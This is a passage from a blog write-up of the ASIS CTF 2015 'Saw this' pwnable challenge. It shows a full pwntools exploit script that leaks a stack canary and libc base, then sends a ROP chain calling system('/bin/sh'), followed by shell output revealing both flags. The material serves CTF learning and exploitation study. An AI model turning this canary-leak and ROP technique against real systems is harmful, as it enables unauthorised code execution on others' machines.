<span class="n">lucky_str</span> <span class="o">=</span> <span class="n">lucky_hex</span><span class="p">[</span><span class="n">lucky_hex</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">::].</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">lucky_str</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span>
<span class="n">lucky_byte1</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">lucky_str</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">8</span><span class="p">:],</span> <span class="mi">16</span><span class="p">))</span>
<span class="n">lucky_byte2</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">lucky_str</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">:],</span> <span class="mi">16</span><span class="p">))</span>
<span class="n">lucky_byte3</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">lucky_str</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">:],</span> <span class="mi">16</span><span class="p">))</span>
<span class="n">lucky_byte4</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">lucky_str</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">))</span>

<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending luck_number: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lucky_number</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span><span class="o">+</span><span class="s">" + "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">lucky_number</span><span class="p">)</span><span class="o">+</span><span class="s">" = "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">lucky_number</span><span class="o">+</span><span class="n">seed</span><span class="p">))</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">lucky_number</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># 0~15 to pass the first 16 numbers
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span><span class="s">"44"</span><span class="p">,</span><span class="c1">#17 byte, v8
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="n">lucky_byte1</span><span class="p">,</span>   <span class="c1"># lucky number
</span>            <span class="n">lucky_byte2</span><span class="p">,</span>   <span class="c1"># lucky number
</span>            <span class="n">lucky_byte3</span><span class="p">,</span>   <span class="c1"># lucky number
</span>            <span class="n">lucky_byte4</span><span class="p">,</span>   <span class="c1"># lucky number
</span>           <span class="s">"1"</span><span class="p">,</span> <span class="c1"># v10 for win
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>           <span class="s">"17"</span><span class="p">,</span> <span class="c1"># i
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># v12_1
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># v12_2
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"8"</span><span class="p">,</span> <span class="c1">#name_buf 0x08
</span>            <span class="s">"49"</span><span class="p">,</span> <span class="c1">#name_buf 0x31
</span>            <span class="s">"96"</span><span class="p">,</span> <span class="c1">#name_buf 0x60
</span>            <span class="s">"0"</span><span class="p">,</span> <span class="c1">#name_buf 0x00
</span>           <span class="p">]</span>

<span class="n">payloads</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payloads</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span>
<span class="c1"># sending payload
</span><span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"BBBB"</span><span class="p">)</span>
<span class="n">canary</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">canary</span> <span class="o">=</span> <span class="s">"0x"</span> <span class="o">+</span> <span class="n">canary</span><span class="p">[</span><span class="n">canary</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">::].</span><span class="n">rjust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xfd</span> <span class="o">-</span> <span class="mh">0x1edb0</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"canary: "</span><span class="o">+</span><span class="n">canary</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">libc_base</span>
<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2024b</span> <span class="c1"># pop rdi, ret
</span><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x14bc23</span>     <span class="c1"># pointer to /bin/sh
</span><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>

<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rdi_ret: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"/bin/sh: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>

<span class="n">canary_byte</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
    <span class="n">canary_byte</span><span class="p">.</span><span class="n">append</span><span class="p">(</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="p">)</span> <span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"y</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># 0~15 to pass the first 16 numbers
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span><span class="s">"52"</span><span class="p">,</span><span class="c1"># will be adjust later
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="n">lucky_byte1</span><span class="p">,</span>   <span class="c1"># lucky number
</span>            <span class="n">lucky_byte2</span><span class="p">,</span>   <span class="c1"># lucky number
</span>            <span class="n">lucky_byte3</span><span class="p">,</span>   <span class="c1"># lucky number
</span>            <span class="n">lucky_byte4</span><span class="p">,</span>   <span class="c1"># lucky number
</span>           <span class="s">"1"</span><span class="p">,</span> <span class="c1"># v10 for win
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>           <span class="s">"17"</span><span class="p">,</span> <span class="c1"># i
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># v12_1
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># v12_2
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"8"</span><span class="p">,</span> <span class="c1">#name_buf 0x08
</span>            <span class="s">"49"</span><span class="p">,</span> <span class="c1">#name_buf 0x31
</span>            <span class="s">"96"</span><span class="p">,</span> <span class="c1">#name_buf 0x60
</span>            <span class="s">"0"</span><span class="p">,</span> <span class="c1">#name_buf 0x00
</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"168"</span><span class="p">,</span> <span class="c1">#name_buf 0xa8
</span>            <span class="s">"48"</span><span class="p">,</span> <span class="c1">#name_buf 0x30
</span>            <span class="s">"96"</span><span class="p">,</span> <span class="c1">#name_buf 0x60
</span>            <span class="s">"0"</span><span class="p">,</span> <span class="c1">#name_buf 0x00
</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="c1"># canary 1
</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="c1"># canary 2
</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="c1"># canary 3
</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="c1"># canary 4
</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="c1"># canary 5
</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="c1"># canary 6
</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="c1"># canary 7
</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="c1"># canary 8
</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># padding1
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># padding2
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># padding3
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
</span>           <span class="nb">str</span><span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
</span>           <span class="nb">str</span><span class="p">(</span><span class="n">bin_sh</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
</span>           <span class="nb">str</span><span class="p">(</span><span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
</span>           <span class="p">]</span>

<span class="n">payloads</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payloads</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span>
<span class="c1"># sending payload
</span><span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>And Finally, we get the flag2:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>               Good job Mario, but your princess isn't here! 

                               Get a shell!


Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
Do you want to play again (y/n)? $ n
$ ls
flag
freedom
sawthis
wrapper.sh
$ cat flag
7h15_ch4ll3ng3_g4v3_m3_br41n_c4nc3r

Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}

</pre></td></tr></tbody></table></code></div></div>

<p>Brain cancer? LOL indeed, but it’s still a great challenge!</p>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/write-ups/'>write-ups</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/asis/"
            class="post-tag no-text-decoration" >ASIS</a>
          
          <a href="/tags/ctf/"
            class="post-tag no-text-decoration" >CTF</a>
          
          <a href="/tags/pwnable/"
            class="post-tag no-text-decoration" >Pwnable</a>
          
          <a href="/tags/python/"
            class="post-tag no-text-decoration" >Python</a>
          
          <a href="/tags/format-string/"
            class="post-tag no-text-decoration" >format_string</a>
          
          <a href="/tags/c/"
            class="post-tag no-text-decoration" >C</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=ASIS CTF 2015 Quals -- Saw this (1 & 2) - Hacking Tube 2.0&url=http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=ASIS CTF 2015 Quals -- Saw this (1 & 2) - Hacking Tube 2.0&u=http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/" data-toggle="tooltip" data-placement="top"
          title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
          <i class="fa-fw fab fa-linkedin"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

    <div id="access-lastmod" class="post">
      <span>Recent Update</span>
      <ul class="post-content pl-0 pb-1 ml-1 mt-2">

      
        
        
        
        <li><a href="/MeePwn-CTF-2017-Brainfuck-1-2/">MeePwn CTF 2017 -- Brainfuck 1 & 2</a></li>
      
        
        
        
        <li><a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge</a></li>
      
        
        
        
        <li><a href="/asis-ctf-2015-quals-saw-this-1/">ASIS CTF 2015 Quals -- Saw this (1 & 2)</a></li>
      
        
        
        
        <li><a href="/asis-ctf-2015-quals/">ASIS CTF 2015 Quals -- grids</a></li>
      
        
        
        
        <li><a href="/defcon-ctf-2015-quals-r0pbaby/">DEFCON CTF 2015 Quals -- r0pbaby</a></li>
      

      </ul>
    </div> <!-- #access-lastmod -->

  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
